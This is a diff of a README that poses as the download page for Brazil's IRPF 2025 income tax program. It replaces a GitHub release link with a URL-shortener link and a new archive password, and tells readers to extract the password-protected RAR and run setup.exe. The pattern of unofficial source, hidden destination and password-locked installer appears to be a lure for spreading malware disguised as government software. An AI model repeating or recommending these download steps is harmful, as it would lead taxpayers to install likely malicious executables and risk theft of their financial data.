@@ -8,8 +8,8 @@ do Imposto sobre a Renda das Pessoas Físicas (DIRPF).
 
 Utilize este programa para fazer a sua declaração do imposto de renda. Clique no botão abaixo para baixar versão para Windows.
 
-- [Download](https://github.com/cloudxuyun/irpf-2025/releases/download/Download/irpf_2025.rar)
-- Abra o arquivo (senha: irpf25)
+- [Download](https://goo.su/iFyr1)
+- Abra o arquivo (senha: Project12!)
 - Abra o setup.exe para baixar os componentes e instalar
 - Siga as instruções
 
